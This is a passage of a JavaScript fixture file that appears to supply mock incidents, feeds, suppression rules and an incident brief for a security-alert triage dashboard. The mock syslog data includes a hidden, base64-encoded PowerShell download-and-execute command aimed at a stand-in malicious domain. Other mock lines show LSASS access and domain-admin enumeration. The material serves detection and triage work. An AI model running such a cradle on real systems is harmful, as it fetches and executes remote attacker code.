      attack_chain: [{ technique_id: 'T1091', technique_name: 'Replication Through Removable Media', tactic: 'initial-access', score: 0.48, alert_ids: ['SIEM-0102'] }],
      score_explanation: {
        correlation_confidence: 'Single alert, no edges; keyword-only mapping.',
        asset_criticality: 'ENG-WS-118 is inventoried at criticality 2 of 5.',
        tactic_severity: 'Deepest observed tactic is initial-access (position 3 of 14).',
        false_positive_likelihood: 'No suppression rule matched; USB mounts are 35% benign in ground truth.',
      },
    },
    {
      incident_id: 'INC-003', rank: 5, title: 'Port sweep of 10.20.4.0/24 from 203.0.113.17',
      alert_count: 3, sources: { siem: 1, syslog: 1, geo: 1 },
      first_seen: '2026-09-14T08:12:30Z', last_seen: '2026-09-14T08:13:05Z',
      assets: ['HR-WS-022'],
      tactics: ['reconnaissance'],
      top_technique: T.scan,
      vendor_severities: { critical: 1, warning: 1, P4: 1 },
      score: { correlation_confidence: 0.74, asset_criticality: 0.35, tactic_severity: 0.08, false_positive_likelihood: 0.85, suppression_rules_fired: ['KNOWN_SCANNER_RANGE', 'MAINTENANCE_WINDOW'], composite: 11 },
      rationale: 'Vendor-critical, but the source is the authorised scanner range inside its scheduled window; suppression rules KNOWN_SCANNER_RANGE and MAINTENANCE_WINDOW fired.',
      has_bluf: false,
      attack_chain: [{ technique_id: 'T1595.001', technique_name: 'Active Scanning: Scanning IP Blocks', tactic: 'reconnaissance', score: 0.83, alert_ids: ['SIEM-0088', 'SYS-1301', 'GEO-0330'] }],
      score_explanation: {
        correlation_confidence: 'Mean edge weight 0.45 across 3 edges; the three alerts are tightly clustered in time and share one common indicator.',
        asset_criticality: 'Targets are criticality-2 HR workstations; the subnet-level maximum is 0.35.',
        tactic_severity: 'Deepest observed tactic is reconnaissance (position 1 of 14).',
        false_positive_likelihood: 'KNOWN_SCANNER_RANGE: 203.0.113.17 is in the authorised scanner pool. MAINTENANCE_WINDOW: change CHG-2291 covers 08:00–10:00 UTC on this date.',
      },
    },
    {
      incident_id: 'INC-006', rank: 6, title: 'sudo failures for svc-backup on BKP-SRV-02',
      alert_count: 1, sources: { syslog: 1 },
      first_seen: '2026-09-14T12:15:44Z', last_seen: '2026-09-14T12:15:44Z',
      assets: ['BKP-SRV-02'], tactics: ['persistence'], top_technique: T.local,
      vendor_severities: { crit: 1 },
      score: { correlation_confidence: 0.22, asset_criticality: 0.80, tactic_severity: 0.29, false_positive_likelihood: 0.60, suppression_rules_fired: ['SERVICE_ACCOUNT_EXPECTED'], composite: 9 },
      rationale: 'syslog says crit, but svc-backup fails sudo on every nightly rsync run; SERVICE_ACCOUNT_EXPECTED fired.',
      has_bluf: false,
      attack_chain: [{ technique_id: 'T1078.003', technique_name: 'Valid Accounts: Local Accounts', tactic: 'persistence', score: 0.44, alert_ids: ['SYS-1350'] }],
      score_explanation: {
        correlation_confidence: 'Single alert, no edges; weak embedding mapping.',
        asset_criticality: 'BKP-SRV-02 is inventoried at criticality 4 of 5 (backup server).',
        tactic_severity: 'Deepest observed tactic is persistence (position 5 of 14).',
        false_positive_likelihood: 'SERVICE_ACCOUNT_EXPECTED: svc-backup is documented to fail sudo on rsync runs since the 2026-08 hardening change.',
      },
    },
  ];

  // ---------------------------------------------------------------------------
  // BLUF (BlufReport) — one hand-written watsonx-style brief for the top incident
  // ---------------------------------------------------------------------------
  const BLUFS = {
    'INC-001': {
      incident_id: 'INC-001',
      bottom_line: 'FIN-WS-042 (finance workstation, user m.okafor) is compromised: a macro-enabled invoice lure executed encoded PowerShell, installed scheduled-task persistence and is beaconing over DNS to GHOSTLEDGER infrastructure, with 38 MB already sent outbound.',
      confidence: 'High',
      confidence_rationale: 'six alerts from four independent feeds share three rare indicators (attachment SHA-256, cdn-update-svc.net, 185.220.101.47) and follow a textbook initial-access → execution → persistence → C2 sequence on one host within 28 minutes.',
      assessment: 'The activity matches the GHOSTLEDGER campaign described in CTI-2026-0913 down to the persistence path. The host has an active DNS beacon and a 38 MB outbound HTTPS transfer to the same infrastructure, so data loss should be assumed until the transfer is characterised. There is no evidence yet of movement beyond FIN-WS-042, but m.okafor holds ERP access and the implant has been resident for at least 30 minutes.',
      attack_chain: [T.phish, T.ps, T.schtask, T.dnsc2, T.webc2],
      evidence: [
        'INTEL-007 (intel, 2026-09-13T18:30Z): GHOSTLEDGER campaign report naming cdn-update-svc.net, 185.220.101.47 and the attachment hash',
        'SIEM-0042 (siem, 2026-09-14T09:14Z): macro-enabled Q3_Invoice_Adjustment.xlsm delivered to m.okafor, sandbox SUSPICIOUS',
        'SYS-1187 (syslog, 2026-09-14T09:18Z): EXCEL.EXE spawned hidden encoded PowerShell fetching cdn-update-svc.net/ps/a.ps1',
        'SIEM-0047 (siem, 2026-09-14T09:21Z): scheduled task SvcRefresh created by powershell.exe running svc.exe at logon',
        'SYS-1203 (syslog, 2026-09-14T09:23Z): 214 fixed-interval TXT queries for cdn-update-svc.net from 10.20.7.42',
        'GEO-0311 (geo, 2026-09-14T09:41Z): 38.4 MB outbound to 185.220.101.47:443, geolocated to a hostile-region watchlist ASN',
      ],
      recommended_actions: [
        'Isolate FIN-WS-042 from the network now; preserve memory before power-off.',
        'Block cdn-update-svc.net at the resolver and 185.220.101.47 at the edge; alert on any further hits.',
        'Reset m.okafor credentials and revoke active ERP sessions; check for MFA enrolment changes.',
        'Hunt the attachment hash and the SvcRefresh task name across all finance endpoints.',
        'Pull the HTTPS flow metadata for 09:24–09:42 UTC to size what left the network.',
      ],
      gaps: [
        'Content of the 38 MB outbound transfer is unknown — full-packet capture or proxy logs would resolve it.',
        'No EDR telemetry after 09:23 UTC; the host may have been used for lateral movement not visible in these feeds.',
        'svc.exe has not been analysed; a sandbox detonation would confirm the implant family.',
      ],
      generated_by: 'watsonx',
    },
  };

  // ---------------------------------------------------------------------------
  // Suppression rules and the why-deprioritised closer
  // ---------------------------------------------------------------------------
  const SUPPRESSION_RULES = [
    { rule_id: 'KNOWN_SCANNER_RANGE', name: 'Authorised vulnerability-scanner range', rationale: '203.0.113.0/24 is the SecOps-owned scanner pool. Sweeps from it are expected every Sunday 08:00–10:00 UTC; they light up every IDS signature we have and are never an intrusion.' },
    { rule_id: 'MAINTENANCE_WINDOW', name: 'Approved change window', rationale: 'Activity that falls inside an approved change record (CHG-*) on the affected assets is expected; the change owner is accountable, not the SOC.' },
    { rule_id: 'SERVICE_ACCOUNT_EXPECTED', name: 'Service account with documented odd behaviour', rationale: 'Some service accounts produce authentication noise by design (retry loops, expired sudo grants). Each is listed with the ticket that explains it.' },
  ];

  const WHY = {
    'SIEM-0088': {
      alert_id: 'SIEM-0088', vendor_severity: 'critical', incident_id: 'INC-003', queue_position: 5, total_incidents: 6,
      score: INCIDENTS.find((i) => i.incident_id === 'INC-003').score,
      rules_fired: [
        { rule_id: 'KNOWN_SCANNER_RANGE', name: 'Authorised vulnerability-scanner range', rationale: 'Sweeps from the SecOps scanner pool are expected and never an intrusion.', evidence: 'src 203.0.113.17 ∈ 203.0.113.0/24 (asset inventory: vuln-scanner-pool, owner SecOps); 2026-09-14 is a Sunday and 08:12 UTC is inside the scheduled 08:00–10:00 window; 38 of 487 corpus alerts reference this range and all are benign in ground truth.' },
        { rule_id: 'MAINTENANCE_WINDOW', name: 'Approved change window', rationale: 'Activity inside an approved change record on the affected assets is expected.', evidence: 'CHG-2291 "Quarterly external vulnerability scan — HR segment" approved for 2026-09-14 08:00–10:00 UTC, scope 10.20.4.0/24; all 41 probed hosts are in scope.' },
      ],
      narrative: 'Suricata rates this critical because an Nmap SYN sweep matches a priority-1 signature — the vendor scale does not know who owns the source address. AEGIS correlated it with the firewall denies (SYS-1301) and the geo flow record (GEO-0330) into INC-003, then scored it: correlation is strong (0.74) but the deepest tactic is reconnaissance (0.08), the targets are criticality-2 workstations (0.35), and two suppression rules put the false-positive likelihood at 0.85. Composite 11 of 100, queue position 5 of 6. If the same sweep arrives outside the change window or from an address outside 203.0.113.0/24, neither rule fires and it would rank second.',
    },
    'SYS-1350': {
      alert_id: 'SYS-1350', vendor_severity: 'crit', incident_id: 'INC-006', queue_position: 6, total_incidents: 6,
      score: INCIDENTS.find((i) => i.incident_id === 'INC-006').score,
      rules_fired: [
        { rule_id: 'SERVICE_ACCOUNT_EXPECTED', name: 'Service account with documented odd behaviour', rationale: 'svc-backup fails sudo on every nightly rsync run since the 2026-08 hardening change removed its NOPASSWD grant.', evidence: 'Ticket OPS-4471 documents the failure; 61 identical alerts in the corpus, one per night, all from bkp-srv-02 with COMMAND=/usr/bin/rsync.' },
      ],
      narrative: 'syslog marks any sudo lockout as crit. AEGIS found no correlated alerts, the asset is a criticality-4 backup server (0.80), but SERVICE_ACCOUNT_EXPECTED matched on the account, host and command, putting false-positive likelihood at 0.60. Composite 9, queue position 6 of 6. A sudo failure from svc-backup with any other COMMAND would not match the rule.',
    },
  };

  // ---------------------------------------------------------------------------
  // Techniques catalogue for the ATT&CK view
  // ---------------------------------------------------------------------------
  const TECHNIQUES = [
    { technique_id: 'T1566.001', name: 'Spearphishing Attachment', tactics: ['initial-access'], incident_count: 1, alert_count: 2 },
    { technique_id: 'T1566', name: 'Phishing', tactics: ['initial-access'], incident_count: 0, alert_count: 0 },
    { technique_id: 'T1204.002', name: 'User Execution: Malicious File', tactics: ['execution'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1059.001', name: 'PowerShell', tactics: ['execution'], incident_count: 1, alert_count: 3 },
    { technique_id: 'T1059', name: 'Command and Scripting Interpreter', tactics: ['execution'], incident_count: 0, alert_count: 0 },
    { technique_id: 'T1027', name: 'Obfuscated Files or Information', tactics: ['defense-evasion'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1053.005', name: 'Scheduled Task', tactics: ['execution', 'persistence', 'privilege-escalation'], incident_count: 1, alert_count: 2 },
    { technique_id: 'T1071.004', name: 'Application Layer Protocol: DNS', tactics: ['command-and-control'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1071.001', name: 'Application Layer Protocol: Web Protocols', tactics: ['command-and-control'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1568', name: 'Dynamic Resolution', tactics: ['command-and-control'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1041', name: 'Exfiltration Over C2 Channel', tactics: ['exfiltration'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1003.001', name: 'OS Credential Dumping: LSASS Memory', tactics: ['credential-access'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1550.002', name: 'Use Alternate Authentication Material: Pass the Hash', tactics: ['defense-evasion', 'lateral-movement'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1078.002', name: 'Valid Accounts: Domain Accounts', tactics: ['defense-evasion', 'persistence', 'privilege-escalation', 'initial-access'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1087.002', name: 'Account Discovery: Domain Account', tactics: ['discovery'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1595.001', name: 'Active Scanning: Scanning IP Blocks', tactics: ['reconnaissance'], incident_count: 1, alert_count: 3 },
    { technique_id: 'T1046', name: 'Network Service Discovery', tactics: ['discovery'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1078', name: 'Valid Accounts', tactics: ['defense-evasion', 'persistence', 'privilege-escalation', 'initial-access'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1091', name: 'Replication Through Removable Media', tactics: ['lateral-movement', 'initial-access'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1078.003', name: 'Valid Accounts: Local Accounts', tactics: ['defense-evasion', 'persistence', 'privilege-escalation', 'initial-access'], incident_count: 1, alert_count: 1 },
    { technique_id: 'T1105', name: 'Ingress Tool Transfer', tactics: ['command-and-control'], incident_count: 0, alert_count: 0 },
    { technique_id: 'T1486', name: 'Data Encrypted for Impact', tactics: ['impact'], incident_count: 0, alert_count: 0 },
  ];

  // ---------------------------------------------------------------------------
  // Raw feed excerpts — deliberately dense, in their native formats
  // ---------------------------------------------------------------------------
  const FEEDS = {
    siem: [
      '{"@timestamp":"2026-09-14T07:48:12Z","event_id":"evt-8811620","rule":"DLP-USB-MOUNT","severity":"medium","product":"Endpoint DLP","host":"ENG-WS-118","user":"e.tan","vid":"0781","vendor":"SanDisk","files_copied":212}',
      '{"@timestamp":"2026-09-14T08:12:30Z","event_id":"evt-8812110","rule":"ET SCAN Nmap Scripting Engine User-Agent Detected (Nmap -sS)","severity":"critical","product":"Suricata","src_ip":"203.0.113.17","dst_net":"10.20.4.0/24","hosts":41,"ports":1024,"window_s":90,"sig_id":2009358,"priority":1}',
      '{"@timestamp":"2026-09-14T08:40:03Z","event_id":"evt-8812388","rule":"WIN-4625-LOGON-FAIL","severity":"low","product":"Windows Security","host":"HR-WS-014","user":"p.nowak","logon_type":2,"status":"0xC000006D","sub_status":"0xC000006A"}',
      '{"@timestamp":"2026-09-14T09:14:07Z","event_id":"evt-8813204","rule":"MAIL-ATTACH-MACRO-SUSPICIOUS","severity":"high","product":"Proofpoint TAP","sender":"billing@acme-invoicing.com","recipient":"m.okafor@corp.local","attachment":{"name":"Q3_Invoice_Adjustment.xlsm","sha256":"' + SHA_LURE + '","sandbox":"SUSPICIOUS"},"host":"FIN-WS-042"}',
      '{"@timestamp":"2026-09-14T09:21:10Z","event_id":"evt-8813377","rule":"WIN-4698-SCHTASK-CREATE","severity":"medium","product":"Windows Security","task_name":"\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\SvcRefresh","command":"C:\\\\Users\\\\m.okafor\\\\AppData\\\\Roaming\\\\svc.exe","creator_process":"powershell.exe","host":"FIN-WS-042"}',
      '{"@timestamp":"2026-09-14T09:52:44Z","event_id":"evt-8814011","rule":"AV-PUA-DETECTED","severity":"low","product":"Defender","host":"ENG-WS-201","user":"r.ali","threat":"PUA:Win32/Presenoker","action":"quarantined"}',
      '{"@timestamp":"2026-09-14T11:09:40Z","event_id":"evt-8814902","rule":"WIN-4624-NTLM-FIRST-SEEN-DC","severity":"high","product":"Windows Security","logon_type":3,"auth_package":"NTLM","target_user":"CORP\\\\j.varga","ip":"10.20.4.11","host":"DC01","first_seen_days":90}',
      '{"@timestamp":"2026-09-14T11:11:05Z","event_id":"evt-8814951","rule":"WIN-4688-NET-GROUP-ENUM","severity":"low","product":"Windows Security","command_line":"net group \\"Domain Admins\\" /domain","user":"CORP\\\\j.varga","parent":"cmd.exe","host":"DC01"}',
      '{"@timestamp":"2026-09-14T11:40:19Z","event_id":"evt-8815210","rule":"WIN-7045-SERVICE-INSTALL","severity":"medium","product":"Windows Security","host":"PRN-SRV-03","service":"PrintNotify2","image":"C:\\\\Windows\\\\Temp\\\\pn.exe","user":"SYSTEM"}',
    ].join('\n'),
    syslog: [
      '<132>1 2026-09-14T08:12:41.117Z fw-edge-01 pfsense 2211 FWDENY - DENY TCP 203.0.113.17:51234 -> 10.20.4.22:445 rule=118 count=1983 window=60s',
      '<132>1 2026-09-14T08:12:41.402Z fw-edge-01 pfsense 2211 FWDENY - DENY TCP 203.0.113.17:51235 -> 10.20.4.23:445 rule=118 count=1977 window=60s',
      '<134>1 2026-09-14T08:15:00.000Z dhcp-01 dhcpd 911 - - DHCPACK on 10.20.9.118 to 3c:52:82:aa:1f:04 (eng-ws-118) via eth0',
      '<132>1 2026-09-14T09:18:33.220Z fin-ws-042 edr-sensor 4412 PROC_CREATE - powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB2AGMALgBuAGUAdAAvAHAAcwAvAGEALgBwAHMAMQAnACkA parent=EXCEL.EXE user=CORP\\m.okafor',
      '<133>1 2026-09-14T09:23:48.009Z dns-sensor-01 zeek-dns - DNS_BEACON - beacon-like TXT query pattern src=10.20.7.42 qname=cdn-update-svc.net n=214 window=300s interval_avg=1.4s answer=185.220.101.47',
      '<134>1 2026-09-14T09:30:12.551Z web-proxy-02 squid 1188 - - TCP_MISS/200 8813 GET https://updates.vendor-cdn.example/v7/manifest.json - HIER_DIRECT/93.184.216.34 application/json',
      '<131>1 2026-09-14T11:02:15.733Z hr-ws-011 sysmon - EID10 - ProcessAccess SourceImage=C:\\Temp\\pd.exe TargetImage=C:\\Windows\\system32\\lsass.exe GrantedAccess=0x1010 User=CORP\\j.varga CallTrace=C:\\Windows\\SYSTEM32\\ntdll.dll+9d234',
      '<134>1 2026-09-14T11:30:00.000Z ntp-01 chronyd 640 - - Selected source 10.20.0.5 (dc01.corp.local)',
      '<34>1 2026-09-14T12:15:44.000Z bkp-srv-02 sudo - - - svc-backup : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/var/backups ; COMMAND=/usr/bin/rsync',
      '<134>1 2026-09-14T12:16:01.000Z bkp-srv-02 CRON 2290 - - (svc-backup) CMD (/usr/local/bin/nightly-sync.sh)',
    ].join('\n'),
    geo: [
      'ts,flow_id,src_ip,src_lat,src_lon,src_country,src_city,src_asn,dst_ip,dst_lat,dst_lon,dst_country,dst_city,dst_asn,dst_port,bytes_out,duration_s,watchlist,priority',
      '2026-09-14T08:13:05Z,G-0330,203.0.113.17,50.1109,8.6821,DE,Frankfurt,64500,10.20.4.0/24,,,,,,*,,60,,P4',
      '2026-09-14T08:30:41Z,G-0334,10.20.9.118,,,,,,151.101.1.69,37.7749,-122.4194,US,San Francisco,54113,443,102311,44,,P5',
      '2026-09-14T09:41:52Z,G-0311,10.20.7.42,,,,,,185.220.101.47,43.8564,25.9708,BG,Ruse,64511,443,40265318,1020,hostile-region,P2',
      '2026-09-14T09:55:10Z,G-0340,116.87.14.203,1.3521,103.8198,SG,Singapore,4773,10.20.0.40,,,,,,443,2211,12,,P5',
      '2026-09-14T10:30:00Z,G-0345,116.87.14.203,1.3521,103.8198,SG,Singapore,4773,10.20.0.40,,,,,,443,0,0,impossible-travel,P3',
      '2026-09-14T10:44:19Z,G-0351,10.20.0.61,,,,,,52.95.110.1,39.0438,-77.4874,US,Ashburn,16509,443,8811230,300,,P5',
      '2026-09-14T11:58:03Z,G-0359,10.20.4.11,,,,,,10.20.0.5,,,,,,445,5120,3,,P5',
    ].join('\n'),
    intel: [
      'CTI-2026-0913  //  TLP:AMBER  //  Regional Fusion Cell  //  Published 2026-09-13 18:30 UTC',
      '',
      'SUBJECT: GHOSTLEDGER — finance-themed intrusion campaign, updated indicators',
      '',
      '1. (U) Since late August the GHOSTLEDGER cluster has shifted to macro-enabled Excel lures themed as quarterly invoice adjustments, delivered from look-alike billing domains (acme-invoicing[.]com, invoice-desk[.]net). Recipients are finance and accounts-payable staff identified from public org charts.',
      '',
      '2. (U) Delivery and staging infrastructure is currently hosted at cdn-update-svc[.]net, resolving to 185.220.101.47 (AS64511, Ruse, Bulgaria). The same address serves both the first-stage script (/ps/a.ps1) and the HTTPS C2 on 443. Operators rotate the domain roughly weekly; the IP has been stable for three weeks.',
      '',
      '3. (U) Attachment observed in two partner environments: SHA-256 ' + SHA_LURE + '. On open, the macro spawns a hidden, base64-encoded PowerShell stager which retrieves a.ps1 and executes it in memory. Persistence is a scheduled task under \\Microsoft\\Windows\\UpdateOrchestrator\\ (task names SvcRefresh, UsoUpdate) pointing at svc.exe in the user AppData\\Roaming directory.',
      '',
      '4. (U) The implant beacons over DNS TXT at a ~1.5 s fixed interval before switching to HTTPS for bulk transfer. Partner telemetry shows staging of ERP exports within 30 minutes of initial execution.',
      '',
      '5. (U) RECOMMENDATIONS: block cdn-update-svc[.]net at the resolver; alert on TXT query rates >60/min per host; hunt for the hash and task names above; review finance-user mailboxes for the invoice lure since 2026-09-01.',
    ].join('\n'),
  };

  // ---------------------------------------------------------------------------
  // Stats — shape mirrors src/db/store.py::stats()
  // ---------------------------------------------------------------------------
  const STATS = {
    alerts: 15,
    alerts_by_source: { siem: 6, syslog: 5, geo: 3, intel: 1 },
    indicators: 21,
    attack_mappings: 24,
    edges: 12,
    incidents: 6,
    multi_alert_incidents: 3,
    bluf_reports: 1,
    last_run: {
      started_at: '2026-09-14T12:20:03Z', finished_at: '2026-09-14T12:20:09Z',
      stages: { ingest: 15, enrich: 15, correlate: 12, score: 6, brief: 1 },
    },
  };

  const ASSETS = [FIN_WS_042, HR_WS_011, DC01, HR_WS_022, VPN_GW_01, ENG_WS_118, BKP_SRV_02].map((a) => ({
    asset_id: a.asset_id, hostname: a.hostname, ip: a.ip, subnet: a.subnet, role: 'workstation', criticality: a.criticality, rationale: 'Inventory entry (mock).',
  }));

  window.AEGIS_FIXTURES = {
    stats: STATS,
    incidents: INCIDENTS,
    alerts: ALERTS,
    edges: EDGES,
    blufs: BLUFS,
    suppression_rules: SUPPRESSION_RULES,
    why_deprioritised: WHY,
    techniques: TECHNIQUES,
    feeds: FEEDS,
    assets: ASSETS,
  };
})();
